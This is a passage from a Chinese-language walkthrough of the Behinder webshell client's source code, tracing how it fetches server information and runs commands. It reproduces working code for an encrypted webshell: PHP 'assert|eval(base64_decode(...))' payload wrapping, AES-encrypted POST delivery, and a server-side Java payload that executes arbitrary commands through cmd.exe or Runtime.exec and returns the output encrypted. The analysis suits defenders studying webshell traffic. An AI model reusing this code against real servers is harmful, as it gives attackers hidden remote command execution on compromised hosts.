            String basedEncryBincls = Base64.encode(encrypedBincls);
            return basedEncryBincls.getBytes();
        } else if (type.equals("php")) {
            bincls = Params.getParamedPhp(className, params);
            bincls = Base64.encode(bincls).getBytes();
            bincls = ("assert|eval(base64_decode('" + new String(bincls) + "'));").getBytes();
            if (extraData != null) {
                bincls = CipherUtils.mergeByteArray(new byte[][]{bincls, extraData});
            }
            encrypedBincls = Crypt.EncryptForPhp(bincls, key, encryptType);
            return Base64.encode(encrypedBincls).getBytes();
        } else if (type.equals("aspx")) {
            bincls = Params.getParamedAssembly(className, params);
            if (extraData != null) {
                bincls = CipherUtils.mergeByteArray(new byte[][]{bincls, extraData});
            }
            encrypedBincls = Crypt.EncryptForCSharp(bincls, key);
            return encrypedBincls;
        } else if (type.equals("asp")) {
            bincls = Params.getParamedAsp(className, params);
            if (extraData != null) {
                bincls = CipherUtils.mergeByteArray(new byte[][]{bincls, extraData});
            }
            encrypedBincls = Crypt.EncryptForAsp(bincls, key);
            return encrypedBincls;
        } else {
            return null;
        }
    }
接下来调用Utils.requestAndParse来发送数据，这个过程无什么特别，就是post发送带有cookie的请求头，加密编码的字节数组为请求内容的请求报文，并获取服务端的返回结果
    public static Map requestAndParse(String urlPath, Map header, byte[] data, int beginIndex, int endIndex) throws Exception {
        Map resultObj = sendPostRequestBinary(urlPath, header, data);
        byte[] resData = (byte[])resultObj.get("data");
        if ((beginIndex != 0 || endIndex != 0) && resData.length - endIndex >= beginIndex) {
            resData = Arrays.copyOfRange(resData, beginIndex, resData.length - endIndex);
        }
        resultObj.put("data", resData);
        return resultObj;
    }
    public static Map sendPostRequestBinary(String urlPath, Map header, byte[] data) throws Exception {
        Map result = new HashMap();
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        URL url = new URL(urlPath);
        HttpURLConnection conn;
        String key;
        if (Main.currentProxy != null) {
            conn = (HttpURLConnection)url.openConnection(Main.currentProxy);
            if (Main.proxyUserName != null && !Main.proxyUserName.equals("")) {
                key = "Proxy-Authorization";
                String headerValue = "Basic " + Base64.encode((Main.proxyUserName + ":" + Main.proxyPassword).getBytes());
                conn.setRequestProperty(key, headerValue);
            }
        } else {
            conn = (HttpURLConnection)url.openConnection();
        }
        conn.setRequestProperty("Content-Type", "application/octet-stream");
        conn.setRequestMethod("POST");
        if (header != null) {
            Iterator var13 = header.keySet().iterator();
            while(var13.hasNext()) {
                key = (String)var13.next();
                conn.setRequestProperty(key, (String)header.get(key));
            }
        }
        conn.setDoOutput(true);
        conn.setDoInput(true);
        conn.setUseCaches(false);
        OutputStream outwritestream = conn.getOutputStream();
        outwritestream.write(data);
        outwritestream.flush();
        outwritestream.close();
        byte[] buffer;
        boolean var10;
        DataInputStream din;
        int length;
        if (conn.getResponseCode() == 200) {
            din = new DataInputStream(conn.getInputStream());
            buffer = new byte[1024];
            var10 = false;
            while((length = din.read(buffer)) != -1) {
                bos.write(buffer, 0, length);
            }
            byte[] resData = bos.toByteArray();
            System.out.println("res before decrypt:" + new String(resData));
            result.put("data", resData);
            Map responseHeader = new HashMap();
            Iterator var11 = conn.getHeaderFields().keySet().iterator();
            while(var11.hasNext()) {
                String key = (String)var11.next();
                responseHeader.put(key, conn.getHeaderField(key));
            }
            responseHeader.put("status", String.valueOf(conn.getResponseCode()));
            result.put("header", responseHeader);
            return result;
        } else {
            din = new DataInputStream(conn.getErrorStream());
            buffer = new byte[1024];
            var10 = false;
            while((length = din.read(buffer)) != -1) {
                bos.write(buffer, 0, length);
            }
            throw new Exception(new String(bos.toByteArray(), "GBK"));
        }
    }
然后就是在ShellService里解密响应报文的数据，
    String result = "";
    Map params = new LinkedHashMap();
    byte[] data = Utils.getData(this.currentKey, this.encryptType, "BasicInfo", params, this.currentType);
    Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
    byte[] resData = (byte[])resultObj.get("data");
    try {
        result = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        return result;
    } catch (Exception var7) {
        var7.printStackTrace();
        throw new Exception("请求失败:" + new String(resData, "UTF-8"));
    }
在BasicInfoUtil里解码获取到的服务器信息并显示
    JSONObject basicInfoObj = new JSONObject(mainShell.currentShellService.getBasicInfo());
    final String basicInfoStr = new String(Base64.decode(basicInfoObj.getString("basicInfo")), "UTF-8");
    final String driveList = (new String(Base64.decode(basicInfoObj.getString("driveList")), "UTF-8")).replace(":\\", ":/");
    final String currentPath = new String(Base64.decode(basicInfoObj.getString("currentPath")), "UTF-8");
    final String osInfo = (new String(Base64.decode(basicInfoObj.getString("osInfo")), "UTF-8")).toLowerCase();
    mainShell.basicInfoMap.put("basicInfo", basicInfoStr);
    mainShell.basicInfoMap.put("driveList", driveList);
    mainShell.basicInfoMap.put("currentPath", currentPath);
    mainShell.basicInfoMap.put("osInfo", osInfo.replace("winnt", "windows"));
    Display.getDefault().syncExec(new Runnable() {
        public void run() {
            if (!statusLabel.isDisposed()) {
                baseInfoView.setText(basicInfoStr);
                statusLabel.setText("基本信息获取完成，你可以使用CTRL+F进行搜索");
至此，服务器基本信息获取完成，getBasicInfo执行完成。
# 0x05 执行命令 runCmd
明白了上面getBasicInfo的过程的话，runCmd这部分其实就好理解了，大体过程和上面getBasicInfo差不多，只是动态生成的payload字节数组不同。输入要执行的命令，可以看到在ShellService.runCmd里，也是调用Utils.getData和Utils.requestAndParse，然后解密和解码返回的数据，再返回出去显示。
    public JSONObject runCmd(String cmd) throws Exception {
        Map params = new LinkedHashMap();
        params.put("cmd", cmd);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "Cmd", params, this.currentType);
        Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[])resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");
        JSONObject result = new JSONObject(resultTxt);
        Iterator var9 = result.keySet().iterator();
        while(var9.hasNext()) {
            String key = (String)var9.next();
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }
这是Utils.getData里className就是net.rebeyond.behinder.payload.java.cmd
    byte[] bincls;
    byte[] encrypedBincls;
    if (type.equals("jsp")) {
        className = "net.rebeyond.behinder.payload.java." + className;
        bincls = Params.getParamedClass(className, params);
        if (extraData != null) {
            bincls = CipherUtils.mergeByteArray(new byte[][]{bincls, extraData});
        }
        encrypedBincls = Crypt.Encrypt(bincls, key);
        String basedEncryBincls = Base64.encode(encrypedBincls);
        return basedEncryBincls.getBytes();
跟进这个Cmd类，入口还是equais方法，在equals里的核心就是这个RunCMD方法，接收传入的cmd，判断是windows还是linux，然后执行命令并返回命令执行结果
    public boolean equals(Object obj) {
            PageContext page = (PageContext)obj;
            this.Session = page.getSession();
            this.Response = page.getResponse();
            this.Request = page.getRequest();
            page.getResponse().setCharacterEncoding("UTF-8");
            HashMap result = new HashMap();
            try {
                result.put("msg", this.RunCMD(cmd));
                result.put("status", "success");
            } catch (Exception var13) {
                result.put("msg", var13.getMessage());
                result.put("status", "success");
            } finally {
                try {
                    ServletOutputStream so = this.Response.getOutputStream();
                    so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                    so.flush();
                    so.close();
                    page.getOut().clear();
                } catch (Exception var12) {
                    var12.printStackTrace();
                }
            }
            return true;
        }
        private String RunCMD(String cmd) throws Exception {
            Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
            String result = "";
            if (cmd != null && cmd.length() > 0) {
                Process p;
                if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
                    p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
                } else {
                    p = Runtime.getRuntime().exec(cmd);
                }
                BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), "GB2312"));
                for(String disr = br.readLine(); disr != null; disr = br.readLine()) {
                    result = result + disr + "\n";
                }
                result = new String(result.getBytes(osCharset));
            }
            return result;
        }
将命令执行结果加密base64编码然后返回
    try {
        ServletOutputStream so = this.Response.getOutputStream();
        so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
        so.flush();
        so.close();
        page.getOut().clear();
    } catch (Exception var12) {
        var12.printStackTrace();
    }
ShellService.runCmd方法解密数据并返回
    public JSONObject runCmd(String cmd) throws Exception {
        Map params = new LinkedHashMap();
        params.put("cmd", cmd);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "Cmd", params, this.currentType);
        Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[])resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");
        JSONObject result = new JSONObject(resultTxt);
        Iterator var9 = result.keySet().iterator();
        while(var9.hasNext()) {
            String key = (String)var9.next();